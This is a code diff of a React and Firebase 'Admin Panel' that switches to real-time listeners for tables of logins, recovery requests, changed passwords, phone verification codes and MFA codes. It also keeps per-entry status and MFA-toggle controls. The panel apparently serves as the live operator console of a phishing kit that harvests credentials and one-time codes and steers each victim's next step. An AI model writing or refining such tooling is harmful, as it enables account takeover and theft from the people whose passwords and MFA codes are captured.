@@ -1,5 +1,5 @@
 import React, { useEffect, useState } from "react";
-import { database, ref, get, child, update } from "../firebase";
+import { database, ref, child, update, onValue } from "../firebase";
 import "./login.css";
 
 const Admin = () => {
@@ -9,59 +9,54 @@ const Admin = () => {
   const [newPasswords, setNewPasswords] = useState([]);
   const [mfaCodes, setMfaCodes] = useState([]);
 
-
-
   useEffect(() => {
-    const fetchData = async () => {
-      const dbRef = ref(database);
+    const dbRef = ref(database);
 
-      // Fetch logins
-      const loginsSnap = await get(child(dbRef, "logins"));
-      if (loginsSnap.exists()) {
-        const data = loginsSnap.val();
-        const formatted = Object.entries(data).map(([id, val]) => ({ id, ...val }));
-        setLogins(formatted);
+    // Real-time listeners
+    const unsubLogins = onValue(child(dbRef, "logins"), (snapshot) => {
+      if (snapshot.exists()) {
+        const data = snapshot.val();
+        setLogins(Object.entries(data).map(([id, val]) => ({ id, ...val })));
       }
+    });
 
-      // Fetch recoveries
-      const recSnap = await get(child(dbRef, "recoveries"));
-      if (recSnap.exists()) {
-        const data = recSnap.val();
-        const formatted = Object.entries(data).map(([id, val]) => ({ id, ...val }));
-        setRecoveries(formatted);
+    const unsubRecoveries = onValue(child(dbRef, "recoveries"), (snapshot) => {
+      if (snapshot.exists()) {
+        const data = snapshot.val();
+        setRecoveries(Object.entries(data).map(([id, val]) => ({ id, ...val })));
       }
+    });
 
-      // Fetch verifications
-      const verSnap = await get(child(dbRef, "verifications"));
-      if (verSnap.exists()) {
-        const data = verSnap.val();
-        const formatted = Object.entries(data).map(([id, val]) => ({ id, ...val }));
-        setVerifications(formatted);
+    const unsubVerifications = onValue(child(dbRef, "verifications"), (snapshot) => {
+      if (snapshot.exists()) {
+        const data = snapshot.val();
+        setVerifications(Object.entries(data).map(([id, val]) => ({ id, ...val })));
       }
+    });
 
-      // Fetch newPasswords
-      const newPassSnap = await get(child(dbRef, "newPasswords"));
-      if (newPassSnap.exists()) {
-        const data = newPassSnap.val();
-        const formatted = Object.entries(data).map(([id, val]) => ({ id, ...val }));
-        setNewPasswords(formatted);
+    const unsubPasswords = onValue(child(dbRef, "newPasswords"), (snapshot) => {
+      if (snapshot.exists()) {
+        const data = snapshot.val();
+        setNewPasswords(Object.entries(data).map(([id, val]) => ({ id, ...val })));
       }
+    });
 
-      // Fetch MFA Codes
-      const mfaSnap = await get(child(dbRef, "mfa_verifications"));
-      if (mfaSnap.exists()) {
-        const data = mfaSnap.val();
-        const formatted = Object.entries(data).map(([id, val]) => ({ id, ...val }));
-        setMfaCodes(formatted);
+    const unsubMfaCodes = onValue(child(dbRef, "mfa_verifications"), (snapshot) => {
+      if (snapshot.exists()) {
+        const data = snapshot.val();
+        setMfaCodes(Object.entries(data).map(([id, val]) => ({ id, ...val })));
       }
+    });
 
-
+    return () => {
+      unsubLogins();
+      unsubRecoveries();
+      unsubVerifications();
+      unsubPasswords();
+      unsubMfaCodes();
     };
-
-    fetchData();
   }, []);
 
-  // Create a map phone -> code from verifications
   const phoneToCodeMap = {};
   verifications.forEach(({ phone, code }) => {
     phoneToCodeMap[phone] = code;
@@ -69,20 +64,11 @@ const Admin = () => {
 
   const handleDecision = async (id, status) => {
     await update(ref(database, `logins/${id}`), { status });
-    setLogins((prev) =>
-      prev.map((entry) => (entry.id === id ? { ...entry, status } : entry))
-    );
   };
 
   const toggleMfa = async (id, current) => {
-  await update(ref(database, `logins/${id}`), { mfa: !current });
-  setLogins(prev =>
-    prev.map(entry =>
-      entry.id === id ? { ...entry, mfa: !current } : entry
-    )
-  );
-};
-
+    await update(ref(database, `logins/${id}`), { mfa: !current });
+  };
 
   const thStyle = {
     borderBottom: "2px solid #ccc",
@@ -101,6 +87,7 @@ const Admin = () => {
       <div className="login-box" style={{ width: "100%", maxWidth: "900px" }}>
         <h2 className="login-title">Admin Panel - Login History</h2>
 
+        {/* Logins */}
         <table style={{ width: "100%", borderCollapse: "collapse" }}>
           <thead>
             <tr>
@@ -110,7 +97,6 @@ const Admin = () => {
               <th style={thStyle}>Status</th>
               <th style={thStyle}>Action</th>
               <th style={thStyle}>MFA</th>
-
             </tr>
           </thead>
           <tbody>
@@ -136,19 +122,19 @@ const Admin = () => {
                   </button>
                 </td>
                 <td style={tdStyle}>
-                <button onClick={() => toggleMfa(entry.id, entry.mfa || false)}>
-                  {entry.mfa ? "Disable MFA" : "Enable MFA"}
-                </button>
+                  <button onClick={() => toggleMfa(entry.id, entry.mfa || false)}>
+                    {entry.mfa ? "Disable MFA" : "Enable MFA"}
+                  </button>
                 </td>
               </tr>
             ))}
           </tbody>
         </table>
 
+        {/* Recovery */}
         <h2 className="login-title" style={{ marginTop: "40px" }}>
           Recovery Requests
         </h2>
-
         <table style={{ width: "100%", borderCollapse: "collapse" }}>
           <thead>
             <tr>
@@ -170,10 +156,10 @@ const Admin = () => {
           </tbody>
         </table>
 
+        {/* New Passwords */}
         <h2 className="login-title" style={{ marginTop: "40px" }}>
           Changed Passwords
         </h2>
-
         <table style={{ width: "100%", borderCollapse: "collapse" }}>
           <thead>
             <tr>
@@ -193,10 +179,10 @@ const Admin = () => {
           </tbody>
         </table>
 
+        {/* MFA */}
         <h2 className="login-title" style={{ marginTop: "40px" }}>
           MFA Codes
         </h2>
-
         <table style={{ width: "100%", borderCollapse: "collapse" }}>
           <thead>
             <tr>
@@ -215,7 +201,6 @@ const Admin = () => {
             ))}
           </tbody>
         </table>
-
       </div>
     </div>
   );
